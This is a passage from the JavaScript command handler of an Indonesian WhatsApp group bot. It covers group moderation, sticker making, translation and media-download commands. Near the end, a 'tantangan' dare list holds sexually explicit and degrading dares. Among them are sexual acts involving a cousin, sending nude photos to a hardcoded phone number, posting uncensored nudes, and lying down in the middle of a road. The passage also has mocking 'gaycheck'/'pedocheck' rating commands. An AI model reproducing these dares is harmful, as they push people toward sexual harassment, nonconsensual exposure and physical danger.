     if (!isAdmins && !isCreator) return replay(mess.useradmin)
     let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
     await XeonBotInc.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => replay(`Wakatta!`)).catch((err) => replay(jsonformat(err)))
     }
     break

     case 'code69': case 'kick':{
        if (isBan) return reply(mess.banned)	 			
     if (isBanChat) return reply(mess.bangc)
     if (!m.isGroup) return replay(mess.grouponly)
     if (!isBotAdmins) return replay(mess.botadmin)
     if (!isAdmins && !isCreator) return replay(mess.useradmin)
     if (args[0] === "@6285161888973") return reply ("Kamu mau miuna kick?")
     let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
     await XeonBotInc.groupParticipantsUpdate(m.chat, [users], 'remove')
     }
     break


     case 'join': case 'code200':{
     if (isBan) return reply(mess.banned)	
     if (isBanChat) return reply(mess.bangc)
     if (!isCreator) return replay(mess.botowner)
     if (!args[0]) return replay(`Where's the link?`)
     vdd = args[0]
     let vcc = vdd.split("https://chat.whatsapp.com/")[1]
     if (!vcc) return replay("Link invalid!")
     if (isCreator) {
     await XeonBotInc.groupAcceptInvite(vcc).then(async(res) => replay(jsonformat(res))).catch(_ => _)
     replay("Aku udah masuk Ri oniichan")
     } else {
     XeonBotInc.query({
     tag: "iq",
     attrs: {
     type: "get",
     xmlns: "w:g2",
     to: "@g.us"
     },
     content: [{ tag: "invite", attrs: { code: vcc } }]
     }).then(async(res) => {
     sizny = res.content[0].attrs.size
     if (sizny < 20) {
     teks = `Sorry, munimun 20 members are required in a group to add bot!`
     sendOrder(m.chat, teks, "667140254502463", fs.readFileSync('./Assets/pic7.jpg'), `${global.packname}`, `${global.BotName}`, "916909137213@s.whatsapp.net", "AR6NCY8euY5cbS8Ybg5Ca55R8HFSuLO3qZqrIYCT7hQp0g==", "99999999999999999999")
     } else if (sizny > 20) {
     await XeonBotInc.groupAcceptInvite(vcc).then(async(res) => replay(jsonformat(res))).catch(_ => _)
     replay("Joined !")
     } else {
     replay("Error")
     }
     }).catch(_ => _)
     }
     }
     break

case 'kapankah':
if (isBan) return reply(mess.ban)	 			
if (isBanChat) return reply(mess.banChat)
				if (!text) return replay(`Tambahin Textnya!\n Contoh : *${prefix + command} Kapan saya bisa ngentot waifu?* `)
					const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi','20 Hari Lagi', '25 Hari Lagi','30 Hari Lagi','35 Hari Lagi','40 Hari Lagi','45 Hari Lagi','50 Hari Lagi','55 Hari Lagi','60 Hari Lagi','65 Hari Lagi','70 Hari Lagi','75 Hari Lagi','80 Hari Lagi','85 Hari Lagi','90 Hari Lagi','100 Hari Lagi','5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi','20 Bulan Lagi', '25 Bulan Lagi','30 Bulan Lagi','35 Bulan Lagi','40 Bulan Lagi','45 Bulan Lagi','50 Bulan Lagi','55 Bulan Lagi','60 Bulan Lagi','65 Bulan Lagi','70 Months More','75 Bulan Lagi','80 Bulan Lagi','85 Bulan Lagi','90 Bulan Lagi','100 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','Besok','Setelah Dajjal Turun',' 1 Abad Lagi','69 Abad Lagi',`After This Command, You Too ${q}`]
					const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
                                         XeonBotInc.sendMessage(from, { text: `Question : ${q}\nAnswer : *${kapankah}*` }, { quoted: m })
		                          break
		

		
case 'gura':
case 'gurastick':{
	if (isBan) return reply(mess.ban)
	if (isBanChat) return reply(mess.banChat)
var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/gura')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await XeonBotInc.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break	
		
		
case 'kalkulator': case 'kal': case 'calculate':{
   if (isBan) return reply(mess.banned)	 			
if (isBanChat) return reply(mess.bangc)
if (args.length < 1) return reply(`Contoh Alat Hitung\n\nDitambah *+*\nDikurangan *-* \nDibagi */* \nDikali *\n\nContoh *-kalkulator 2+2* Tambah\nContoh *-kalkulator 2-2* Kurang\nContoh *-kalkulator 2/2* Bagi\nContoh *-kalkulator 2*2* Kali\n`)
let qsd = args.join(" ")
if (typeof mathjs.evaluate(qsd) !== 'number') {
reply('Error')
} else {
reply(`\`\`\`「 _Alat Hitung_ 」\`\`\`\n\n*Input :* ${qsd}\n*Hasilnya :* ${mathjs.evaluate(qsd.replace(/×/g, "*").replace(/x/g, "*").replace(/÷/g, "/"))}`)
}
}
break

case 'public': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!isCreator) return reply(mess.owner)
 XeonBotInc.public = true
 reply('Sekarang aku bisa diewe- digunakan oleh semua orang!')
 XeonBotInc.setStatus(`Mode : Public`)
 }
 break
 
 case 'self': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!isCreator) return reply(mess.botowner)
 XeonBotInc.public = false
 reply('Sekarang Cuma owner yang bisa ngen- menggunakan aku!')
 XeonBotInc.setStatus(`Mode : Self`)
 }
 break


case 'toimage': case 'toimg': {
   if (isBan) return reply(mess.banned)	 			
if (isBanChat) return reply(mess.bangc)
if (!m.quoted) return reply('Reply Image')
if (!/webp/.test(mime)) return reply(`Reply sticker with caption *${prefix + command}*`)
reply(mess.waiting)
let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
XeonBotInc.sendMessage(m.chat, { image: buffer }, { quoted: m})
fs.unlinkSync(ran)
})
}
break

case 'tomp4': case 'tovideo': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!m.quoted) return reply('Reply Image')
 if (!/webp/.test(mime)) return reply(`Reply sticker with caption *${prefix + command}*`)
 reply(mess.waiting)
 let { webp2mp4File } = require('./lib/uploader')
 let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
 let webpToMp4 = await webp2mp4File(media)
 await XeonBotInc.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Here it is...' } }, { quoted: m })
 await fs.unlinkSync(media)
 }
 break


case 'togif': case 'getgif':{
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!m.quoted) return reply('Reply Image')
 if (!/webp/.test(mime)) return reply(`Reply sticker with caption *${prefix + command}*`)
 reply(mess.waiting)
 let { webp2mp4File } = require('./lib/uploader')
 let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
 let webpToMp4 = await webp2mp4File(media)
 await XeonBotInc.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Converted From Webp To Gif' }, gifPlayback: true }, { quoted: m })
 await fs.unlinkSync(media)
 }
 break


	/*case 'tourl': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 reply(mess.waiting)
 let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
 let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
 if (/image/.test(mime)) {
 let anu = await TelegraPh(media)
 reply(util.format(anu))
 } else if (!/image/.test(mime)) {
 let anu = await UploadFileUgu(media)
 reply(util.format(anu))
 }
 await fs.unlinkSync(media)
 }
 break*/

 case 'owner': case 'creator': case 'mod': case 'mods':{
    XeonBotInc.sendContact(m.chat, global.Owner, m)
    }
    break
case 'translate' : case 'trans' : case 'tl' :
reply(`Contoh!\n\nEnglish Ke Indo : -TLid Ri is my owner\n\nIndo Ke English : -TLen Ri adalah pemilikku`)
break

case 'tlenglish': case 'transenglish': {
    if (isBan) return reply(mess.banned)
    if (!args.join(" ")) return replay("eumm, kata-katanya mana?")
    tes = await fetchJson (`https://megayaa.herokuapp.com/api/translate?to=en&kata=${args.join(" ")}`)
    Infoo = tes.info
    Detek = tes.translate
    replay(`Input : ${Detek}\nTranslation Results : ${Infoo}`)
    }
    break
case 'tlindo': case 'transindo': {
    if (isBan) return reply(mess.banned)
    if (!args.join(" ")) return replay("ehmm, kata²nya mana?")
    tes = await fetchJson (`https://megayaa.herokuapp.com/api/translate?to=id&kata=${args.join(" ")}`)
    Infoo = tes.info
    Detek = tes.translate
    replay(`Input : ${Detek}\nTranslation Results : ${Infoo}`)
    }
    break
case 'scanime' :{
if (!isMod) return reply (mess.mod)
 let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
 let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
 if (/image/.test(mime)) {
 let anu = await TelegraPh(media)
ri = await fetchJson(`https://api.lolhuman.xyz/api/wait?apikey=${lolkey}&img=${util.format(anu)}`)
XeonBotInc.sendMessage(m.chat, {video :{ url : ri.result.video}, caption : `Judul : ${ri.result.title_romaji}          Episode : ${ri.result.episode}.       Persamaan : ${ri.result.similarity}.`})
 } else if (!/image/.test(mime)) {
 let anu = await UploadFileUgu(media)
 reply(util.format(anu))
 }
 await fs.unlinkSync(media)
 }
 break


case 'kuso': case 'kusonime': {
    if (!isMod) return reply (mess.mod)
    if (isBan) return reply(mess.banned)
    if (!args.join(" ")) return replay("ehmm, kata²nya mana?")
    reply (`Bentar lagi dicari....`)
    tes = await fetchJson (`https://api.lolhuman.xyz/api/kusonimesearch?apikey=${lolkey}&query=${args.join(" ")}`)
    a = tes.result.title
    thum = tes.result.thumbnail
  const juduljep = tes.result.japanese
  genre = tes.result.genre
  season = tes.result.seasons
  const produser = tes.result.producers
  tipe = tes.result.type
  status = tes.result.status
  const totalep = tes.result.total_episode
  durasi = tes.result.duration
  rilis = tes.result.released_on
   const link480pgs = tes.result.link_dl["480p"]["Google Sharer"]
   link480pmega = tes.result.link_dl["480p"]["Mega.nz"]
    link720pgs = tes.result.link_dl["720p"]["Google Sharer"]
 const  link720pmega =tes.result.link_dl["720p"]["Mega.nz"]
   const sinop = tes.result.desc
    let teks = `Judul : ${a}\nJudul Jepun : ${juduljep}\n\nGenre : ${genre}\n\nStatus : ${status}\nType : ${tipe}\nTanggal Rilis : ${rilis}\nDurasi : ${durasi}\nTotal Episode : ${totalep}\nSeason : ${season}\nProduser : ${produser}\n\nLink Download 480p!\nGoogle Share : ${link480pgs}\nMega : ${link480pmega}\n\nLink Download 720p!\nGoogle Share : ${link720pgs}\nMega : ${link720pmega}\n\nSinopsis : ${sinop}`
    let riMessage = {
    image : {url : thum},
    caption : teks,
    footer : `Miuna` ,
    headerType : 4,
    }
    
   XeonBotInc.sendMessage(from, riMessage).catch((err) => {
                     reply(`Web Eror Atau Judul Salah!`)
                 })  
   
   }
    break



case 'gimage': case 'gig': case 'googleimage':{
   if (isBan) return reply(mess.banned)	 			
if (isBanChat) return reply(mess.bangc)
if (!args[0]) return reply("Enter a search term to get Google Image!")
let gis = require('g-i-s')
gis(args.join(" "), async (error, result) => {
n = result
images = n[Math.floor(Math.random() * n.length)].url
let buttons = [
{buttonId: `-dongnasi`, buttonText: {displayText: 'Sedekah Kak!'}, type: 1}
]
let buttonMessage = {
image: { url: images },
caption: `「 _Google Image Search_ 」
_Search Term_ : ${text}
_Media Url_ : ${images}`,
footer: `${global.BotName}`,
buttons: buttons,
headerType: 4,

}
XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
})
}
break


case 'google': case 'search': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!args[0]) return reply(`Contoh: ${prefix + command} <query>\nUses : ${prefix + command} apa arti cinta`)
 let google = require('google-it')
 google({'query': args.join(" ")}).then(res => {
 let teks = `「 *Google Search Engine* 」\n\n*Search term:* ${args.join(" ")}\n\n\n`
 for (let g of res) {
 teks += `*Title* : ${g.title}\n\n`
 teks += `*Description* : ${g.snippet}\n\n`
 teks += `*Link* : ${g.link}\n\n\n        -----------------------------------------------------------------------------\n\n`
 } 
 reply(teks)
 })
 }
 break


 case 'igdl': case 'instagram': case 'instagramreels': case 'igreels': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!args[0]) return reply(`Example :\n${prefix + command} https://www.instagram.com/p/CcvJGuxh9VI/?igshid=YmMyMTA2M2Y=`)
 try {
 hx.igdl(args[0]).then(async(resed) => {
 ini_anu = []
 anu_list = []
 textbv = `「 _Instagram Downloader_ 」\n\nUsername : ${resed.user.username ? resed.user.name : "undefined"}\nFollowers : ${resed.user.followers}`
 urut = 1
 for (let i = 0; i < resed.medias.length; i++) {
 ini_anu.push({
  "type": resed.medias[i].fileType,
  "url": resed.medias[i].url
 })
 }
 ilod = 1
 for (let i of ini_anu) {
 anu_list.push({buttonId: `-ig ${i.type} ${i.url}`, buttonText: {displayText: `Media ${ilod++}`}, type: 1})
 }
 textbv += `\n\n_Select the media below to download_`
 let buttons = anu_list
 let buttonMessage = {
 image:BotLogo,
 jpegThumbnail:Thumb,
 caption: textbv,
 footer: `${global.BotName}`,
 buttons: buttons,
 headerType: 4
 }
 XeonBotInc.sendMessage(from, buttonMessage, {quoted:m})
 })
 } catch (err) {
 reply("An Error Occured!")
 }
 }
 break

 case 'ig': {
    if (isBan) return reply(mess.banned)	 			
if (isBanChat) return reply(mess.bangc)
if (args[0] === "mp4") {
XeonBotInc.sendMessage(from, {video:{url:args[1]}, caption:'Here it is...', mimetype:'video/mp4'}, {quoted:m})
} else if (args[0] === "jpg") {
XeonBotInc.sendMessage(from, {image:{url:args[1]}, caption:'Here it is...'}, {quoted:m})
} else {
reply("Error! ")
}
}
break

case 'jpeg': {
    if (isBan) return reply(mess.banned)	 			
if (isBanChat) return reply(mess.bangc)
 if (!args[0]) return reply(`Please provide link!`)
 try {
 XeonBotInc.sendMessage(from, {image:{url:args[0]}, caption:"Success!"}, {quoted:m})
 } catch {
 reply("Link Eror kek otakmu!")
 }
 }
 break

 case 'igtv': {	            
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
                 if (!text) return reply(`Please provide link!`)
                 const { instagramdl, instagramdlv2, instagramdlv3 } = require('@bochilteam/scraper')
                 if (!isUrl(args[0]) && !args[0].includes('instagram.com')) return reply('*Invalid link!*')
                 instagramdlv3(`${text}`).then(async (data) => {            
                 var buf = await getBuffer(data[0].thumbnail)        
                 XeonBotInc.sendMessage(m.chat, { video: { url: data[0].url }, jpegThumbnail:buf, caption: `${BotName}`}, { quoted: m })
                 }).catch((err) => {
                     reply(mess.error)
                 })
             }
             break
             
case 'twitter': case 'td': case 'twitterdl': {     
   if (isBan) return reply(mess.banned)	 			
if (isBanChat) return reply(mess.bangc)	             
             if (!text) return reply(`Please provide link!`)
                if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return reply(`*Invalid link!*`)
  reply (`Sek...`)
 link = args[0]
ri = await fetchJson(`https://api.akuari.my.id/downloader/twitter?link=${link}`)
desc = ri.desc
nail = ri.thumb
const hd = ri.HD
sd = ri.SD
XeonBotInc.sendMessage(from, {video:{url:hd}, mimetype:"video/mp4", caption: 'Kualitas HD' }, {quoted:m})

            }
            break

case 'fb': case 'fbdl':{
if (!args.join(" ")) return reply (`Linknya kak?`)
reply (mess.waiting)
ri = await fetchJson(`https://api.lolhuman.xyz/api/facebook?apikey=${lolkey}&url=${args.join(" ")}`)
link = ri.result
XeonBotInc.sendMessage(m.chat, {video : {url : link}, caption : `Miuna Facebook Downloader`},{quoted : m })
}
break

case 'mp4': {
if (!isCreator) return reply (mess.botowner)
    if (isBan) return reply(mess.banned)	 	
 if (isBanChat) return reply(mess.bangc)
 if (!args[0]) return reply (`Link?`)
 XeonBotInc.sendMessage(from,{video : {url : args[0]}, caption : `Yattaa..`})
 }
 break
case 'mp3': {
if (!isCreator) return reply (mess.botowner)
    if (isBan) return reply(mess.banned)	 	
 if (isBanChat) return reply(mess.bangc)
 if (!args[0]) return reply (`Link?`)
 XeonBotInc.sendMessage(from,{audio : {url : args[0]}, caption : `Silahkeun`})
 }
 break

 case 'tiktok':{
    if (isBan) return reply(mess.banned)
  if (isBanChat) return reply(mess.bangc)
if (!q) return reply('Please provide the link !')
reply(mess.waiting)
if (!q.includes('tiktok')) return reply(`Invalid tiktok link!`)
 const musim_rambutan = await XeonBotIncTiktok(`${q}`).catch(e => {
reply(mess.error) 
} )
 const XeonBotInctiktokop = musim_rambutan.result.watermark
texttk = `_Please choose the button below_`
let buttons = [
{buttonId: `-ttnowm ${q}`, buttonText: {displayText: 'Watermark Free'}, type: 1},
{buttonId: `-ttaud ${q}`, buttonText: {displayText: 'Audio '}, type: 1}
]
let buttonMessage = {
video: {url:XeonBotInctiktokop},
caption: texttk,
footer: `${BotName}`,
buttons: buttons,
headerType: 4,

}
XeonBotInc.sendMessage(from, buttonMessage, {quoted:m})
}
break

case 'tiktoknowm': case 'ttnowm':{
    if (isBan) return reply(mess.banned)
  if (isBanChat) return reply(mess.bangc)
if (!q) return reply('Please provide the link !')
reply(mess.waiting)
if (!q.includes('tiktok')) return reply(`That's not a tiktok link!`)
 const musim_rambutan = await XeonBotIncTiktok(`${q}`).catch(e => {
reply(mess.error) 
} )

 const XeonBotInctiktoknowm = musim_rambutan.result.nowatermark
  XeonBotInc.sendMessage(from, { video: { url: XeonBotInctiktoknowm }, caption: "Here it is..." }, { quoted: m })
 }
break

case 'mp': {
if (!isMod) return reply(`🤭🤭🤭`)
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!text) return reply ('Judulnga?')

 await sleep(1500)
 reply(mess.waiting)
 const YT=require('./lib/ytdlcore')
 const { isUrl, fetchBuffer } = require('./lib/Function')
 let yts = require("yt-search")
 let search = await yts(text)
 let anu = search.videos[0]
 let buttons = [
 {buttonId: `-ytad ${text}`, buttonText: {displayText: '♫ Audio'}, type: 1},
 {buttonId: `-ytvd ${text}`, buttonText: {displayText: '► Video'}, type: 1}

 ]
 let buttonMessage = {
 image: { url: anu.thumbnail },
 caption: `「  _Miuna Youtube Downloader_  」
*Judul :* ${anu.title}
*Durasi :* ${anu.timestamp}
*Penonton :* ${anu.views}
*Diupload :* ${anu.ago}
*Channel :* ${anu.author.name}
*Url :* ${anu.url}`,
 footer: `${global.BotName}`,
 buttons: buttons,
 headerType: 4,

 }
 XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
 }
 break
case 'music': case 'play': case 'song': case 'ytplay': {
if (m.isGroup) return reply(`untuk mengurangi spam , fitur ini hanya dapat digunakan dichat pribadi`)    
if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 const YT=require('./lib/ytdlcore')
 const { isUrl, fetchBuffer } = require('./lib/Function')
 if(!text) return reply ("Ehem, Judulnya?")
 await sleep(1500)
 reply(mess.waiting)
 let yts = require("yt-search")
 let search = await yts(text)
 let anu = search.videos[0]
 let buttons = [
 {buttonId: `-ytad ${text}`, buttonText: {displayText: '♫ Audio'}, type: 1},
 {buttonId: `-ytvd ${text}`, buttonText: {displayText: '► Video'}, type: 1}

 ]
 let buttonMessage = {
 image: { url: anu.thumbnail },
 caption: `「  _Miuna Youtube Downloader_  」
 
*Judul :* ${anu.title}
*Durasi :* ${anu.timestamp}
*Penonton :* ${anu.views}
*Diupload :* ${anu.ago}
*Channel :* ${anu.author.name}
*Url :* ${anu.url}`,
 footer: `${global.BotName}`,
 buttons: buttons,
 headerType: 4,

 }
 XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
 }
 break
case 'ytad': {
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    const YT=require('./lib/ytdlcore')
    let yts = require("yt-search")
    let search = await yts(text)
    let anu = search.videos[0]
    const ytmp3play = await YT.mp3(anu.url)
    let stats = fs.statSync(ytmp3play.path)
    let fileSizeInBytes = stats.size;
    if (fileSizeInBytes > 60000000) return reply('Gomenne, gabisa ngirim audio lebih dari *60MB* 🥺 ')
    
 await XeonBotInc.sendMessage(from, {document: fs.readFileSync(ytmp3play.path),fileName: anu.title + '.mp3',mimetype: 'audio/mpeg',}, {quoted:m})
 }
 break

 case 'ytvd': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 const YT=require('./lib/ytdlcore')
    let yts = require("yt-search")
    let search = await yts(text)
    let anu = search.videos[0]
    const ytmp4play = await YT.mp4(anu.url)
    let vidduration =ytmp4play.duration;
    if (vidduration > 1800) return reply('Gomenne, gabisa ngirim vido lebih dari *30 menit* 🥺 ')
 XeonBotInc.sendMessage(from, {video:{url:ytmp4play.videoUrl}, mimetype:"video/mp4", caption:anu.title+'By *Miuna Downloader*',}, {quoted:m})
 }
 break
 
case 'couplepp':  case 'ppcouple': {
if (isBan) return reply(mess.banned)
if (isBanChat) return reply(mess.bangc)
         reply(mess.waiting)
         let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
         let random = anu[Math.floor(Math.random() * anu.length)]
         XeonBotInc.sendMessage(m.chat, { image: { url: random.male }, caption: `Untuk Cowok...` }, { quoted: m })
         XeonBotInc.sendMessage(m.chat, { image: { url: random.female }, caption: `Untuk Cewek...` }, { quoted: m })
     }
 break

case 'pinterest': case 'pin': {
    if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
 if (!args.join(" ")) return reply("Tolong cantumin keywordnya 🥺 ")
 try {
 hx.pinterest(args.join(" ")).then(async(res) => {
 imgnyee = res[Math.floor(Math.random() * res.length)]
 let buttons = [
 {buttonId: `-pinterest ${args.join(" ")}`, buttonText: {displayText: '>>'}, type: 1}
 ]
 let buttonMessage = {
 image: { url: imgnyee },
 caption:  `Title : ` + args.join(" ") + `\nMedia Url : `+imgnyee,
 footer: `${global.BotName}`,
 buttons: buttons,
 headerType: 4,
 
 }
 XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
 }).catch(_ => _)
 } catch {
 reply("Error")
 }
 }
 break



case 'swm': case 'take': case 'stickerwm': case 'steal':{
    if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
if (!args.join(" ")) return reply(`Use command: -steal Miuna Bot|By: Ri`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0];
const atnm = swn.split("|")[1];
if (m.quoted.isAnimated === true) {
XeonBotInc.downloadAndSaveMediaMessage(quoted, "gifee")
XeonBotInc.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maximum 10 seconds is allowed!')
let media = await quoted.download()
let encmedia = await XeonBotInc.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
await fs.unlinkSync(encmedia)
} else {
reply(`Kirim Foto/Video ${prefix + command}\nCuma Durasi vidio 1-9 detik yang dibolehin!`)
}
}
break




case 'sm': case 'smeme': case 'stickermeme': case 'stickmeme': {
let { TelegraPh } = require('./lib/uploader')
if (!text) return reply(`Send/Reply Photo With Caption ${prefix + command} *text*`)
if (text.includes('|')) return reply(`Send/Reply Photo With Caption ${prefix + command} *text*`)
if (!/image/.test(mime)) return reply(`Send/Reply Photo With Caption ${prefix + command} *text*`)
reply(mess.waiting)
mee = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(mee)
meme = `https://api.memegen.link/images/custom/-/${text}.png?background=${mem}`
memek = await XeonBotInc.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(memek)
await fs.unlinkSync(mee)
}
break

case 'sgif': case 'sticker': case 's': {
    if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)

 if (/image/.test(mime)) {
 let media = await quoted.download()
 let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
 await fs.unlinkSync(encmedia)
 } else if (/video/.test(mime)) {
 if ((quoted.msg || quoted).seconds > 11) return reply('Maximum 10 seconds!')
 let media = await quoted.download()
 let encmedia = await XeonBotInc.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
 await fs.unlinkSync(encmedia)
 } else {
 reply(`Kirim Foto/Video dengan textnya ${prefix + command}\nDurasi Vidio 1-9 Detik`)
 }
 }
 break

case 'wiki':
    if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
if (args.length < 1) return reply(' Mau nyari apa oniichan? ')
const res2 = await wikiSearch(q).catch(e => {
return reply('Error, Hasil Tidak Ditemukan!') 
}) 
const result2 = `*Title :* ${res2[0].judul}\n*Wiki :* ${res2[0].wiki}`
XeonBotInc.sendMessage(from, { image : { url : res2[0].thumb }, caption : result2}) 
break

case 'gempa':
    if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
const tres = await Gempa()
var { Waktu, Lintang, Bujur, Magnitude, Kedalaman, Wilayah, Map } = tres.result
console.log(Map)
const captt = `Time : ${Waktu}\nLatitude : ${Lintang}\nLongitude : ${Bujur}\nWilayah : ${Wilayah}`
XeonBotInc.sendMessage(from, { image : { url : Map }, caption : captt})
break

case 'covidinfo':
case 'covid':
    if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
const c = await covid()
var { kasus, kematian, sembuh } = c[0]
XeonBotInc.sendMessage(from, {text : `Case : ${kasus}\n\nMeninggal : ${kematian}\n\nSembuh : ${sembuh}`}, m)
break


case 'cabulcheck':
case 'gaycheck':
case 'cutecheck':
case 'pedocheck':
case 'sangecheck':
case 'uglycheck':
if (isBan) return reply(mess.banned)
if (isBanChat) return reply(mess.bangc)
if (!text) return replay(`Tag Seseorang, Contoh : ${prefix + command} @Mamat Stress`)
if(args[0] === "@6285161888973") { 
return reply (`Hoho Tidak semudah itu santoso`)
}
const sangeh = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
XeonBotInc.sendMessage(from, { text: `*${command}*\n\nNama : ${q}\nJawaban : *${sange}%*` }, { quoted: m })
					break



                   
 case 'tantangan':
    if (isBan) return reply(mess.banned)
    if (isBanChat) return reply(mess.bangc)
                   const dare =[
	" _Post lewd telanjang di facebook Tanpa adanya sensor_ ",
	" _Gacoli selama sebulan_ ",
	" _Berhenti Coli sampe mati_ ",		   
	" _Sebutkan Nama Titit Lu!_ ",		   
	" Buat Cewek : Ajak Ngewe *Ri* \n Buat cowok : Jilat kaki *Ri* ",		   
	" _Masukin Vibrator ke lobang bool lu_ ",		   
	" Buka Link Ini https://www.youtube.com/watch?v=G_Avv9tslzo ",
	" Nonton video ini sampai habis tanpa skip https://www.youtube.com/watch?v=HIcSWuKMwOw ", 
	" _Chat whatsapp emak atau bapak lu , dan bilang *Mak/Pak Pengen Kawin*_ ",
        " _Chat +6285161888973 trus kirimin Lewd_ ",
        " _Selamat Kamu mendapatkan link pemersatu bangsa https://mega.nz/folder/iYISVKbB#sUbxEuSnO1mfp4yZYcHEcQ _",		   
	" _Pinjem tangan sepupulu , trus tangannya lu arahin ke titid lu_ ",
	" _Berak tapi gacebok_ ",		   
	" _Desah di voicenote _ ",
	" _Entod Lobang bool sendiri_ ",		   
	" _jilat foto trap_ ",
	" _Jitak pala adek/Kakak lu_",
	" _Pengen Keisekai ? jika pengen maka segeralah rebahan ditengah jalan!\n\nJika tidak, segeralah coli sampe crot 10x_",
	" _Coli sekarang Juga dan Pejunya lu telan_",
	"Dibilangin Sedekah Ke *Ri* :v",
	 "Sedekah ke *Ri* :v",		   
         "Minum kencing sendiri",
         "Topup in admin",
         "Saling sepong dengan mamat",
         "Sentil titit admin.",
         "Ajak Adu batang dengan member lain",
         "Telpon mantanlu trus Ajak Ngentot didepan pacarnya",
         "Nyanyi keun lagu terakhir yang elu dengerin",
         "Coli sekarang juga!",
         "Entot admin",
         "Ajak orang random untuk coli bareng",
         "Sebutkeun nama mantan lo!",
         "Ajak 1anggota untuk Saling sepong!",
         "Kirim foto waifu lo!",
         "Chat 1member disini .trus kirim foto titid lu kedia, abis itu SS kirimin kesini!",
         "Buka salah 1 aib lo!",
         "tag orang yang pengen lu entot",
         "Crotin bantal sendiri.",
         "Ubah namalu jadi PENGIKUT MAMAT PEDO",
         "Teriak KONTOL di Voice Note",
         "Jilat titid sendiri",
         "katain waifu lu lonte!",
         "Ngocog ditempat umum",
         "Teriak PENGEN NGENTOT divoice note*",
         "Kirim foto telanjang waifu lo",
         "Sedekah kekotak amal terdekat*",
         "Ubah namalu jadi PENIKMAT 2D",
         "Entot bantal sendiri",
         "Katain waifu orang LONTE",
         "Katakan MARK KONTOL",
         "mengajak nikah sepupu didepan keluarga besar",
         "SS History bokeplu ",
         "Sebutkeun Fetishmu!",
	 "Hari ini sholat 5waktu",
